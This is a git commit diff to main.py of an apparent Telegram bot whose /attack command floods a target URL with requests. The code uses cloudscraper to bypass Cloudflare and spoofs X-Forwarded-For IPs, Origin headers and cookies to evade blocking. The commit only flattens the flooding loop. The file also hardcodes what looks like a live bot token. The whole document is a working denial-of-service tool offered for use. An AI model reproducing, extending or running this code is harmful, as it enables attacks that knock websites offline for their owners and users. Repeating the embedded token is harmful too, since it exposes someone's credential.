b2ece1d4477d6cdb00560d0c7c416f772385a324
Omorfaruk0099 <119661669+Omorfaruk0099@users.noreply.github.com>
2024-02-08 12:07:58 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,11 @@
 import requests
 import random
 import string
-import sys
 import json
-
-from cloudscraper import create_scraper
 from telegram import Update
 from telegram.ext import Updater, CommandHandler, CallbackContext
+
+from cloudscraper import create_scraper
 
 # Telegram bot token
 TOKEN = "6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI"
@@ -26,32 +25,29 @@ def attack(update: Update, context: CallbackContext) -> None:
     url = args[0]
     time = int(args[1])
 
-    def main():
-        for _ in range(time):
-            try:
-                response = scraper.get(url)
-                response_json = json.loads(response.text)
-                cookie = response_json["request"]["headers"]["cookie"]
-                useragent = response_json["request"]["headers"]["User-Agent"]
+    for _ in range(time):
+        try:
+            response = scraper.get(url)
+            response_json = json.loads(response.text)
+            cookie = response_json["request"]["headers"]["cookie"]
+            useragent = response_json["request"]["headers"]["User-Agent"]
 
-                rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
-                ip = '.'.join([random_byte() for _ in range(4)])
+            rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+            ip = '.'.join([random_byte() for _ in range(4)])
 
-                headers = {
-                    'User-Agent': useragent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'Upgrade-Insecure-Requests': '1',
-                    'cookie': cookie,
-                    'Origin': f'http://{rand}.com',
-                    'Referrer': f'http://google.com/{rand}',
-                    'X-Forwarded-For': ip
-                }
+            headers = {
+                'User-Agent': useragent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'Upgrade-Insecure-Requests': '1',
+                'cookie': cookie,
+                'Origin': f'http://{rand}.com',
+                'Referrer': f'http://google.com/{rand}',
+                'X-Forwarded-For': ip
+            }
 
-                requests.get(url, headers=headers)
-            except Exception as e:
-                pass
-
-    main()
+            requests.get(url, headers=headers)
+        except Exception as e:
+            pass
 
 def main():
     updater = Updater(TOKEN)
